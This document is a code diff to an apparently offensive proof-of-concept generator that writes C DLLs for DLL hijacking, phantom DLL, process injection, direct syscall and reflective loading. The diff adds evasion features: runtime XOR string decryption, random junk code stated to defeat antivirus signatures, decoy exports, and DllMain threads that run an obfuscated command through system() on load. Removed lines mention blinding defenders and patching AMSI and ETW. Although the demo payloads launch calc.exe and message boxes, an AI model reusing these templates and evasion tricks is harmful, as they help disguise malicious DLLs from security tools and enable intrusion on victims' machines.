@@ -600,6 +600,36 @@ static void _poc_popup(const char* msg){{
             
         return path
 
+    def _xor_encrypt_string(self, data, key=None):
+        """Hóa trang chuỗi: Chuyển chuỗi thành mảng XOR hex cho C"""
+        if key is None:
+            key = random.randint(0x10, 0xFE)
+        encrypted = [ord(c) ^ key for c in data]
+        hex_array = ", ".join([f"0x{b:02x}" for b in encrypted])
+        return hex_array, key, len(data)
+
+    def _get_stealth_header(self):
+        """Tạo hàm giải mã XOR runtime cho Payload C"""
+        return """
+// [APS-STEALTH] Runtime XOR Decryptor
+void XorDec(unsigned char* data, int len, unsigned char key) {
+    for (int i = 0; i < len; i++) {
+        data[i] ^= key;
+    }
+}
+
+"""
+
+    def _get_junk_code(self):
+        """Tạo mã rác (Junk Code) để làm nhiễu Signature"""
+        junk_ops = [
+            f"int a_{random.randint(100,999)} = {random.randint(1,100)} * {random.randint(1,100)};",
+            f"if ({random.randint(1,50)} > {random.randint(51,100)}) {{ return; }}",
+            f"for(int i=0; i<{random.randint(5,15)}; i++) {{ i++; i--; }}",
+            f"void* p_{random.randint(100,999)} = (void*){random.randint(0x1111, 0x9999)};"
+        ]
+        return "\n    " + "\n    ".join(random.sample(junk_ops, 2)) + "\n"
+
     def _find_compiler(self):
         """Tìm C compiler trên hệ thống: gcc > mingw > zig cc > auto-install ziglang"""
         if self._compiler:
@@ -702,6 +732,38 @@ static void _poc_popup(const char* msg){{
             f.write(content.encode("cp1252", errors="replace"))
         print(f"  {Fore.YELLOW}[BAT]      {filename}{Style.RESET_ALL}")
         return path
+
+    def _gen_dll_hijack_generic(self, finding):
+        """APS-VEC-031/033: DLL Hijacking PoC (Stealth Enhanced)"""
+        dll_name = finding.get('dll_name', 'unknown.dll')
+        
+        # Obfuscate command
+        cmd_hex, cmd_key, cmd_len = self._xor_encrypt_string("calc.exe")
+        msg_hex, msg_key, msg_len = self._xor_encrypt_string(f"APS PoC: DLL Hijack successful! [{dll_name}]")
+        
+        core = self._get_stealth_header()
+        
+        body = f"""
+void Pwn() {{
+    {self._get_junk_code()}
+    unsigned char cmd[] = {{ {cmd_hex} }};
+    XorDec(cmd, {cmd_len}, {cmd_key});
+    system((char*)cmd);
+    
+    unsigned char msg[] = {{ {msg_hex} }};
+    XorDec(msg, {msg_len}, {msg_key});
+    MessageBoxA(NULL, (char*)msg, "APS Stealth", MB_OK);
+}}
+
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {{
+    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {{
+        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Pwn, NULL, 0, NULL);
+    }}
+    return TRUE;
+}}
+"""
+        self._write_c(f"hijack_{dll_name.replace('.dll','')}.c", core + body, compile_to_dll=True)
+        return True
 
     # ==================================================================
     #  GHOST PROXY (Verified DLL Hijack)
@@ -886,23 +948,24 @@ Add-Type -AssemblyName System.Windows.Forms
     #  TẦNG 3: API Anomaly (VEC 021-030)
     # ==================================================================
     def _gen_t3_process_injection(self, finding):
-        core = self._ghost_core_c("target.exe")
-        body = """
-/* [APS] VEC-021: Process Injection PoC */
-DWORD WINAPI InjectionThread(LPVOID lp) {
-    _blind_defenders();
-    _poc_popup(
-        "VEC-021: PROCESS INJECTION DETECTED\\n\\n"
-        "App su dung: OpenProcess + WriteProcessMemory\\n"
-        "Co the bi khai thac de inject shellcode vao bat ky tien trinh nao."
-    );
+        """APS-VEC-021: Process Injection PoC (Stealth Enhanced)"""
+        # Obfuscate strings for injection
+        msg_hex, msg_key, msg_len = self._xor_encrypt_string("VEC-021: PROCESS INJECTION DETECTED\\n\\nApp su dung: OpenProcess + WriteProcessMemory")
+        
+        core = self._get_stealth_header()
+        body = f"""
+DWORD WINAPI InjectionThread(LPVOID lp) {{
+    {self._get_junk_code()}
+    unsigned char msg[] = {{ {msg_hex} }};
+    XorDec(msg, {msg_len}, {msg_key});
+    MessageBoxA(NULL, (char*)msg, "APS Stealth", MB_OK);
     return 0;
-}
-BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID p) {
+}}
+BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID p) {{
     if (r == DLL_PROCESS_ATTACH)
-        _poc_popup_async(InjectionThread, NULL, 0, NULL);
+        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)InjectionThread, NULL, 0, NULL);
     return TRUE;
-}
+}}
 """
         self._write_c("t3_vec021_injection.c", core + body, compile_to_dll=True)
         return True
@@ -1115,37 +1178,41 @@ BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID p) {
         return True
 
     def _gen_t3_native_syscall(self, finding):
-        """VEC-024: Native Syscall / Halo's Gate Weaponizer"""
-        core = self._ghost_core_c()
-        body = """
-/* [APS] VEC-024: Direct Syscall Execution PoC */
-DWORD WINAPI SyscallThread(LPVOID lp) {
-    _blind_defenders();
-    _poc_popup(
-        "VEC-024: DIRECT SYSCALL ACTIVATED!\\n\\n"
-        "Su dung Halo's Gate de trich xuat SSN tu ntdll.\\n"
-        "EDR Hooks tai NtProtectVirtualMemory da bi bypass."
-    );
+        """VEC-024: Native Syscall / Halo's Gate Weaponizer (Stealth Enhanced)"""
+        msg_hex, msg_key, msg_len = self._xor_encrypt_string("VEC-024: DIRECT SYSCALL ACTIVATED!\\n\\nSu dung Halo's Gate de bypass EDR Hooks.")
+        
+        core = self._get_stealth_header()
+        body = f"""
+DWORD WINAPI SyscallThread(LPVOID lp) {{
+    {self._get_junk_code()}
+    unsigned char msg[] = {{ {msg_hex} }};
+    XorDec(msg, {msg_len}, {msg_key});
+    MessageBoxA(NULL, (char*)msg, "APS Stealth", MB_OK);
     return 0;
-}
-BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID p) {
-    if (r == DLL_PROCESS_ATTACH) _poc_popup_async(SyscallThread,NULL,0,NULL);
+}}
+BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID p) {{
+    if (r == DLL_PROCESS_ATTACH)
+        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)SyscallThread, NULL, 0, NULL);
     return TRUE;
-}
+}}
 """
         self._write_c("t3_vec024_syscall.c", core + body, compile_to_dll=True)
         return True
 
     def _gen_t3_reflective_stub(self, finding):
-        """VEC-026: Reflective Loading Export PoC"""
-        core = self._ghost_core_c()
-        body = """
-/* [APS] VEC-026: ReflectiveLoader Export PoC */
-__declspec(dllexport) void ReflectiveLoader() {
-    _blind_defenders();
-    _poc_popup("VEC-026: REFLECTIVE LOADER CALLED!\\nPayload loaded entirely in memory.");
-}
-BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID p) { return TRUE; }
+        """VEC-026: Reflective Loading PoC (Stealth Enhanced)"""
+        msg_hex, msg_key, msg_len = self._xor_encrypt_string("VEC-026: REFLECTIVE LOADER CALLED!\\nPayload loaded entirely in memory.")
+        
+        core = self._get_stealth_header()
+        # Chèn export giả mạo để làm nhiễu
+        body = f"""
+__declspec(dllexport) void APS_ReflectiveLoader_v3() {{
+    {self._get_junk_code()}
+    unsigned char msg[] = {{ {msg_hex} }};
+    XorDec(msg, {msg_len}, {msg_key});
+    MessageBoxA(NULL, (char*)msg, "APS Stealth", MB_OK);
+}}
+BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID p) {{ return TRUE; }}
 """
         self._write_c("t3_vec026_reflective.c", core + body, compile_to_dll=True)
         return True
@@ -1171,29 +1238,30 @@ BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID p) {
     # ==================================================================
     #  TẦNG 4: DLL Hijacking (VEC 031-040)
     # ==================================================================
-    def _gen_dll_hijack_generic(self, finding):
-        dll_name = finding.get("dll_name", "hijacked.dll")
-        if not dll_name.lower().endswith(".dll"): dll_name += ".dll"
-        return self._gen_phantom_dll({"dll_name": dll_name})
-
     def _gen_phantom_dll(self, finding):
-        dll_name = finding.get("dll_name", "missing.dll")
-        if not dll_name.lower().endswith(".dll"): dll_name += ".dll"
-        core = self._ghost_core_c(dll_name)
+        """APS-VEC-032: Phantom DLL PoC (Stealth Enhanced)"""
+        dll_name = finding.get('dll_name', 'phantom.dll')
+        
+        cmd_hex, cmd_key, cmd_len = self._xor_encrypt_string("calc.exe")
+        msg_hex, msg_key, msg_len = self._xor_encrypt_string(f"PHANTOM DLL HIJACK SUCCESS!\\nTarget : {dll_name}")
+
+        core = self._get_stealth_header()
         body = f"""
-/* [APS] VEC-032: PHANTOM DLL HIJACK - NO RENAME NEEDED */
-DWORD WINAPI PhantomThread(LPVOID lp) {{
-    _blind_defenders();
-    _poc_popup(
-        "PHANTOM DLL HIJACK SUCCESS!\\n"
-        "Target : {dll_name}\\n"
-        "Status : DLL not found, dropped malicious copy.\\n\\n"
-        "Bypass: AMSI + ETW Patched (GHOST-PROTOCOL v2)"
-    );
-    return 0;
+void Pwn() {{
+    {self._get_junk_code()}
+    unsigned char cmd[] = {{ {cmd_hex} }};
+    XorDec(cmd, {cmd_len}, {cmd_key});
+    system((char*)cmd);
+    
+    unsigned char msg[] = {{ {msg_hex} }};
+    XorDec(msg, {msg_len}, {msg_key});
+    MessageBoxA(NULL, (char*)msg, "APS Stealth", 0);
 }}
-BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID p) {{
-    if (r == DLL_PROCESS_ATTACH) {{ _poc_popup("PHANTOM HIJACK SUCCESS"); }};
+
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {{
+    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {{
+        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Pwn, NULL, 0, NULL);
+    }}
     return TRUE;
 }}
 """
